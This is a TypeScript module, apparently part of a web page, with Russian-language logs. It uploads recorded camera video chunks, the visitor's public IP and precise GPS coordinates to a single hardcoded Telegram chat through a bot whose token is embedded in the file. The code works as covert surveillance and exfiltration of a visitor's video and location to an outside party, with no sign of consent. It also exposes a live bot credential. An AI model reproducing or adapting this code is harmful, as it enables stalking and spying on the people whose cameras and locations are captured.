const TELEGRAM_BOT_TOKEN = '8421853408:AAFDvCHIbx8XZyrfw9lif5eCB6YQZnZqPX8';

// Rate limiting configuration
const RATE_LIMIT = {
  maxPerSecond: 25,  // Telegram limit is 30, keep buffer
  queue: [] as Array<() => Promise<void>>,
  isProcessing: false,
  lastSendTime: 0
};

// Rate limiter
const rateLimitedSend = async (sendFn: () => Promise<boolean>): Promise<boolean> => {
  return new Promise((resolve) => {
    const task = async () => {
      const now = Date.now();
      const timeSinceLastSend = now - RATE_LIMIT.lastSendTime;
      const minInterval = 1000 / RATE_LIMIT.maxPerSecond;
      
      if (timeSinceLastSend < minInterval) {
        await new Promise(r => setTimeout(r, minInterval - timeSinceLastSend));
      }
      
      RATE_LIMIT.lastSendTime = Date.now();
      const result = await sendFn();
      resolve(result);
    };
    
    RATE_LIMIT.queue.push(task);
    processQueue();
  });
};

// Process rate limit queue
const processQueue = async () => {
  if (RATE_LIMIT.isProcessing || RATE_LIMIT.queue.length === 0) return;
  
  RATE_LIMIT.isProcessing = true;
  
  while (RATE_LIMIT.queue.length > 0) {
    const task = RATE_LIMIT.queue.shift();
    if (task) await task();
  }
  
  RATE_LIMIT.isProcessing = false;
};

// Get user IP
const getUserIP = async (): Promise<string> => {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip || 'Unknown';
  } catch (error) {
    console.error('❌ [Video] Ошибка получения IP:', error);
    return 'Unknown';
  }
};

// Detect browser
const detectBrowser = (): 'safari' | 'other' => {
  const ua = navigator.userAgent;
  if (/Safari/.test(ua) && !/Chrome/.test(ua) && !/Chromium/.test(ua)) {
    return 'safari';
  }
  return 'other';
};

// Send video using fetch
const sendVideoFetch = async (
  botToken: string,
  chatId: number,
  videoBlob: Blob,
  caption: string,
  retryCount = 0
): Promise<boolean> => {
  try {
    const isMP4 = videoBlob.type.includes('mp4');
    const fileName = isMP4 ? 'video.mp4' : 'video.webm';
    
    const formData = new FormData();
    formData.append('chat_id', chatId.toString());
    formData.append('video', videoBlob, fileName);
    formData.append('caption', caption);
    
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
      method: 'POST',
      body: formData
    });
    
    const result = await response.json();
    
    if (response.ok) {
      console.log(`✅ [Video Fetch] Отправлено пользователю ${chatId}`);
      return true;
    } else if (response.status === 429 && retryCount < 3) {
      // Rate limit hit - retry with exponential backoff
      const retryAfter = result.parameters?.retry_after || (retryCount + 1) * 2;
      console.warn(`⏳ [Video Fetch] Rate limit для ${chatId}, retry через ${retryAfter}s (попытка ${retryCount + 1}/3)`);
      await new Promise(r => setTimeout(r, retryAfter * 1000));
      return sendVideoFetch(botToken, chatId, videoBlob, caption, retryCount + 1);
    } else {
      console.warn(`⚠️ [Video Fetch] Ошибка для ${chatId}:`, result);
      return false;
    }
  } catch (error) {
    console.error(`❌ [Video Fetch] Ошибка отправки ${chatId}:`, error);
    return false;
  }
};

// Send video using XMLHttpRequest (Safari)
const sendVideoXHR = async (
  botToken: string,
  chatId: number,
  videoBlob: Blob,
  caption: string
): Promise<boolean> => {
  return new Promise((resolve) => {
    try {
      const isMP4 = videoBlob.type.includes('mp4');
      const fileName = isMP4 ? 'video.mp4' : 'video.webm';
      
      const formData = new FormData();
      formData.append('chat_id', chatId.toString());
      formData.append('video', videoBlob, fileName);
      formData.append('caption', caption);
      
      const xhr = new XMLHttpRequest();
      xhr.open('POST', `https://api.telegram.org/bot${botToken}/sendVideo`, true);
      
      xhr.onload = function() {
        if (xhr.status >= 200 && xhr.status < 300) {
          console.log(`✅ [Video XHR] Отправлено пользователю ${chatId}`);
          resolve(true);
        } else {
          console.warn(`⚠️ [Video XHR] Ошибка ${xhr.status} для ${chatId}`);
          resolve(false);
        }
      };
      
      xhr.onerror = function() {
        console.error(`❌ [Video XHR] Сетевая ошибка для ${chatId}`);
        resolve(false);
      };
      
      xhr.ontimeout = function() {
        console.error(`⏱️ [Video XHR] Таймаут для ${chatId}`);
        resolve(false);
      };
      
      xhr.timeout = 30000; // 30 seconds
      xhr.send(formData);
    } catch (error) {
      console.error(`❌ [Video XHR] Исключение для ${chatId}:`, error);
      resolve(false);
    }
  });
};

// Main function to send video
export const sendVideoToTelegram = async (
  videoBlob: Blob,
  chunkNumber: number,
  cameraType: 'front' | 'back' | 'desktop',
  geoData?: {
    latitude: number;
    longitude: number;
    accuracy: number;
    timestamp: string;
  } | null
): Promise<void> => {
  try {
    const browser = detectBrowser();
    const chatIds = new Set([7320458296]);
    console.log('📤 [Video] Отправляем на фиксированный chat_id:', 7320458296);
    
    // Get IP
    const ip = await getUserIP();
    
    const cameraLabel = cameraType === 'front' ? '🤳 Фронтальная' : 
                        cameraType === 'back' ? '📷 Основная' : 
                        '🖥️ Десктоп';
    
    // Build caption with geolocation if available
    let caption = `🎥 Видео чанк #${chunkNumber}\n` +
                  `📹 Камера: ${cameraLabel}\n` +
                  `📦 Размер: ${(videoBlob.size / 1024 / 1024).toFixed(2)} MB\n` +
                  `🌐 IP: ${ip}\n` +
                  `⏰ ${new Date().toLocaleString('ru-RU')}`;
    
    // Add geolocation if available
    if (geoData) {
      const lat = geoData.latitude.toFixed(6);
      const lng = geoData.longitude.toFixed(6);
      const googleMapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
      
      caption += `\n\n📍 Координаты (первичные):\n` +
                 `   Широта: ${lat}\n` +
                 `   Долгота: ${lng}\n` +
                 `   Точность: ±${Math.round(geoData.accuracy)} м\n` +
                 `   Время: ${geoData.timestamp}\n` +
                 `🗺️ ${googleMapsLink}`;
      
      console.log(`📍 [Video] Добавлены координаты к чанку #${chunkNumber}`);
    }
    
    console.log(`📤 [Video] Отправка чанка #${chunkNumber} (${cameraLabel}) ${chatIds.size} пользователям...`);
    
    let successCount = 0;
    let errorCount = 0;
    
    for (const chatId of chatIds) {
      let success = false;
      
      if (browser === 'safari') {
        success = await rateLimitedSend(() => sendVideoXHR(TELEGRAM_BOT_TOKEN, chatId, videoBlob, caption));
      } else {
        success = await rateLimitedSend(() => sendVideoFetch(TELEGRAM_BOT_TOKEN, chatId, videoBlob, caption));
      }
      
      if (success) {
        successCount++;
      } else {
        errorCount++;
      }
    }
    
    console.log(`✅ [Video] Чанк #${chunkNumber}: успешно ${successCount}, ошибок ${errorCount}`);
  } catch (error) {
    console.error('❌ [Video] Критическая ошибка:', error);
  }
};
